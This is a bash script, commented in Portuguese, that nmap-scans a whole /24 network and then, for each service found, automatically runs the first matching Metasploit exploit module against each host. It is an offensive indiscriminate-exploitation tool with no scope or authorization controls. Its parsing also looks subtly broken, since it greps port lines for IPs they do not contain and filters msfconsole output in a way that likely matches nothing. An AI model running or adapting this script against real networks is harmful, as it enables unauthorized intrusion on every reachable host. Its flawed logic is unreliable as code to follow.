#!/bin/bash

# Definindo variáveis
rede=$1
arquivo_saida_nmap=$2

# Escaneamento de portas e serviços com o nmap em todos os hosts da rede
echo "Realizando escaneamento de portas e serviços com o nmap em todos os hosts da rede..."
nmap -sS -sV -p- -T4 -oA $arquivo_saida_nmap $rede/24

# Identificação de vulnerabilidades e exploração com o Metasploit em todos os hosts da rede
echo "Identificando vulnerabilidades e tentando explora-las com o Metasploit em todos os hosts da rede..."
ips=$(grep -E "^Nmap scan report for [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" $arquivo_saida_nmap.nmap | awk '{print $5}')
for ip in $ips; do
  servicos=$(grep -E "^[0-9]+/tcp" $arquivo_saida_nmap.nmap | grep $ip | awk '{print $1"/"$3}')
  for servico in $servicos; do
    nome_modulo=$(msfconsole -q -x "search $servico; exit" | grep -E "^exploit/" | head -n 1 | awk '{print $1}')
    if [ ! -z "$nome_modulo" ]; then
      echo "Executando módulo de exploit $nome_modulo para o serviço $servico no host $ip..."
      msfconsole -q -x "use $nome_modulo; set RHOSTS $ip; run; exit"
    fi
  done
done
